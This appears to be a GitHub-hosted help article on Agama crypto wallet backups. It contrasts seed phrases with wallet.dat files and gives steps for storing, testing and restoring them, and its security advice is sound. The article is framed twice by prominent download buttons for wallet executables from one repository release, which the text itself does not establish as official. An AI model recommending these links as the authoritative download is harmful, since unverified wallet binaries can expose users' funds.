[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Agama Wallet Backup: What wallet.dat Covers

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

An Agama backup is either the seed phrase, which can recreate the wallet's keys, or the wallet file, which holds the keys the wallet had already generated plus its metadata. The phrase is portable; the file is not. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and users who relied on one form of backup have found the other missing when they needed it.

## You'll see this if

You are about to reinstall, move machines or retire an old install, and you are not certain whether your backup covers everything the wallet holds.

| Backup | Contains | Restores | Fails when |
|---|---|---|---|
| Seed phrase | The master secret for derivation | Keys, in software that derives the same way | Derivation differs, or addresses lie outside the range |
| Wallet file | Generated keys and wallet metadata | That wallet's addresses, in compatible software | Software generation does not match |
| Password | Nothing on its own | Access to the encrypted file | Phrase or file is lost |
| Address list | Public data only | Nothing; it is a check, not a backup |  -  |

## Why it happens

Wallets generate keys from the phrase on demand, but they also keep a file describing what has been generated. The file exists because deriving everything from scratch on every start would be slow, and because some wallets store additional state alongside the keys.

The consequence is that the two backups are not interchangeable. A phrase restore depends on the software making the same derivation choices, including how many addresses it scans. A file restore depends on the software understanding the file's format. Neither covers the other's failure.

There is also a security difference that matters more than the technical one. The phrase is the entire secret: whoever holds it holds the wallet, in any software, forever. The file is encrypted with the password, which makes it safer to store in more than one place, and useless without the password.

## Fix

Keep both, store them differently, and test before you need them.

1. **Write the phrase down by hand, offline.** Paper or metal, in one physical location you control, never a photo, a note app or a cloud document.
2. **Copy the wallet file to offline media**, if the wallet exposes it, and record which software version produced it.
3. **Record one receiving address** from each asset. It is the check that tells you whether a restore actually worked.
4. **Rehearse a restore once.** A backup you have never restored is only a guess; [restoring an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md) is the procedure.
5. **Re-check after any change of machine or password.** A backup that predates a wallet change is a backup of an older state, not of the current one.

Never enter the phrase into anything except wallet software, and never send a wallet file to a "support" address: a file plus its password is the same as the phrase.

## If that did not work

If the file will not open in current software, the format has moved on. Use the phrase instead, and accept that derivation may differ.

If the phrase restores an empty wallet, the addresses you used are probably outside the range the software scans. [Zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) works through the order of checks.

If the password is lost but the phrase exists, restore from the phrase. The password protects the file; it is not itself a key.

If both are lost, nothing can be recovered by anyone, which the wallet's terms state plainly. No support channel, service or tool can reverse that, and an offer to do so is a way of taking what remains.

## Prevention

- **Store the two backups apart.** One physical location for both defeats the purpose.
- **Do not photograph the phrase.** Screenshots sync to cloud services by default.
- **Label the file with its software version.** It saves an hour of guessing later.
- **Re-test annually.** Media degrade and software changes.
- **Never share either form.** [Why a seed phrase fails](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md) covers careless handling, and [is Agama Wallet safe](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) covers what a downloaded build can expose.

## FAQ

### Does wallet.dat contain the seed phrase?

Not in a form you can read back. It holds the keys the wallet generated, encrypted with your password, which is why it restores those addresses and not necessarily any derived later on.

### Is a wallet file as good as the phrase?

It is a different thing. The file is tied to the software that made it; the phrase is portable in principle. Keep both.

### What should I do if I think the phrase was exposed?

Create a new wallet with a new phrase and move the balance. Reusing an exposed phrase is the one mistake that cannot be undone later, because whoever has it can spend from any wallet that derives from it.

### How often should a backup be re-tested?

Once a year is enough for most people, and again after any change of machine, password or wallet software. The test is a restore into a spare install, not a glance at the paper.

### Does a backup cover every asset in the wallet?

It covers the keys for the addresses the wallet derived. An asset held on an address outside that range, or on a chain the wallet reads differently, may need its own check after restoring.

### Can I back up by copying the whole application folder?

Usually not reliably. The wallet's data directory is the relevant part, and copying the installed program proves nothing about the keys.

### What if I only have the address, not the phrase?

An address is public data. It can show what happened to funds, and it cannot restore access to them.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Restoring an Agama Wallet: Seed, Passphrase and Wallet File](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md)
- [Why a Seed Phrase Fails to Restore a Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md)
- [Agama Wallet Shows Zero Balance: Causes and Checks](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md)
- [Agama Wallet: What It Is, and Which Agama You Are Looking At](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md)
